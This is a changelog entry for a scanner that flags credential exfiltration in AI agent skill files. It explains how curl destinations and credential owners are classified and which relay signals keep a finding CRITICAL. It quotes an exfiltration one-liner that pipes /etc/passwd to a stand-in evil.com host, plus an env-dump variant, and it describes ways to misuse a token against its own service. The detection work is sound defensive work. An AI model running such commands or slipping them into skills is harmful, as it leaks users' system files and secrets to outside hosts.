### Fixed — `--scan-skills` net-exfil names the host a literal curl URL sends to, and a credential variable sent only to a literal local host is WARN (#353, thanks @toasterbook88)

@toasterbook88 scanned a 2,077-file skills tree and read every one of the 107 `EXFILTRATE:net-exfil` rows by hand. They found that the rule fired per line on a network verb plus any `$VAR`, so `BASE_URL=https://api.cloudflare.com/…` three lines up was invisible, and documented API calls read like exfiltration. They then froze a classifier (`classify107.sh`) and published a corrected histogram: about 89 of the 107 were documented service-API calls, and the six that carried a credential all sent it to the service that owns it. They also found the miss the rule is named for: `cat /etc/passwd | curl https://evil.com --data-binary @-` scanned clean. The 0.6.x severity fix made that CRITICAL, and a network verb with no destination stopped firing. This entry adds the part of the flow follow-up promised then that holds up under review: hosts written literally on the curl line.

- **Literal destinations only.** A host counts as proved only when the curl line names it in a literal URL. A `$VAR` or `${VAR}` destination is never resolved from the document. An earlier version of this change resolved a variable bound once to a literal before the line. Five CodeRabbit review rounds each found another way that binding could mislead the proof: an example fence, YAML frontmatter, a loop variable read after `done`, a `for` without `in`, a quote boundary inside `$NAME`, and an unquoted empty word. So this release leaves it out, and those rows stay CRITICAL. Variable-resolved local destinations, with adversarial fuzzing, are a follow-up item.
- **`dest=`** on a net-exfil row lists the hosts the line's `curl` URLs name, and appears only when every host is proved. The row has no `dest=` when any of these is present: a destination holding a `$` or backtick, an unquoted `$VAR` anywhere on the line (the shell may split it into more arguments, or drop it when empty), a proxy (`-x`), `--resolve`, a config file (`-K`), a `VAR=x` prefix such as `https_proxy=…`, a curl that runs as another program (`./curl`), an option the proof does not model, a second network verb outside a `#` comment, a `$(…)` or a trailing `\`. `curl` itself may follow a prompt `$`, a control word (`then`, `do`, …) or a runner that takes no option here (`command`, `time`, `nohup`, `exec`, `sudo`, `env` with no assignment). Within the host it also needs canonical text: a backslash or `%` anywhere in the authority, including the userinfo, an upper-case host, a trailing dot and a non-digit port each leave it unproved. The host is whatever follows the authority's one `@`, so a URL whose userinfo reads `api.github.com` goes to the host after the `@`. A `--url @FILE` value is a URL list (curl 8.13+), never a host. `dest=` says where the URLs point, not where the bytes end up.
- **`owner=`** names the service whose name a credential variable carries, when that service owns every `dest=` host: `CLOUDFLARE`/`CF` for cloudflare.com, `GITHUB`/`GH` for github.com, `AIRTABLE` for airtable.com. The table is small and explicit, and the match is registrable-domain label equality: cloudflare.evil.example, evilcloudflare.com and pages.github.io get no `owner=`. **It is information for triage; the row stays CRITICAL.** A first version made it a WARN downgrade (`why="cred-to-owner"`). An adversarial review showed that downgrade can be abused. A token sent to its own service's API can still move data into an object an attacker controls there: a gist, an issue body, an ssh key added to the account, a member invite, or an attacker's Airtable base. The line can also be steered away from what it says, through a proxy variable, a curlrc, a shadowed `curl` or a sourced file. The downgrade was withdrawn before release.
- **`why="local-dest"`.** A credential variable is WARN, not CRITICAL, only when all of these hold. It is sent by a bare `curl` (no runner word and no `VAR=x` prefix, unlike `dest=`) over HTTP(S), without following redirects. Every host is a literal localhost, 127/8, `::1` or an RFC 1918 address (10/8, 172.16/12, 192.168/16), in canonical spelling. The file shows no relay, forward or redirect anywhere, prose included, since an agent follows prose too. The relay signals are: a background job, `socat`/`nc`/`ncat`, an `ssh -L`/`-R`/`-D` forward, `gopher://` or `smtp://`, a `Host:` header, a `*_proxy` variable, a curlrc, `CURL_HOME` or `--config`/`-K`, a `PATH=` or preload change, a `curl` function or alias, `source`, `eval`, or an `export` of a computed value. That list is a heuristic, not a proof. When a signal is present, the row keeps the severity it had before. Link-local (169.254/16) is not local: 169.254.169.254 is a cloud metadata service.

Only a credential *variable* can reach WARN. An env dump, a key file and a credential-file read stay CRITICAL wherever they go, and `sensitive-read-upload` is CRITICAL whatever the host. On a synthetic tree shaped like the reporter's corrected histogram, the six credential rows stay CRITICAL, no row changes severity, and 2 of the 107 rows name their host (most keep their URL in a variable, which is not resolved). The 80-file adversarial set (`test/skillfix/adv353/`, plus our own and CodeRabbit's shapes, 99 files in all: an eval, a background listener, here-documents, conditional and loop assignments, `"$@"` lists, `--url @FILE`, `read`/`printf -v` rebinding, an example fence, frontmatter, a quote-cut `$NAME`, and an empty unquoted word) keeps every row main gives it, line and severity. Every negative line in `netexfil_flow.md` stays CRITICAL.

The approach takes one idea from NVIDIA SkillSpector's taint tracking (Apache-2.0): keep the finding whenever an operand, flag or command lies outside what the proof models. No SkillSpector code or pattern text is included. The `--scan-skills` categories already credit NVIDIA's skill-scanning work.

Known limits, unchanged: the proof models `curl` only, so a `wget` or `nc` line keeps its line-local grade. A command continued with `\` is read one line at a time, so a credential on the continuation line is not seen. `env | curl --data-binary @- URL`, with no `$VAR` or `base64`, still scans clean. Gates: `test/skillscan.sh` checks 18b and 18c, and `test/regexguardcheck.sh` arm (f4), which bounds the time on 50,000 assignments and 40,000 destination words, and checks the 16-destination cap.
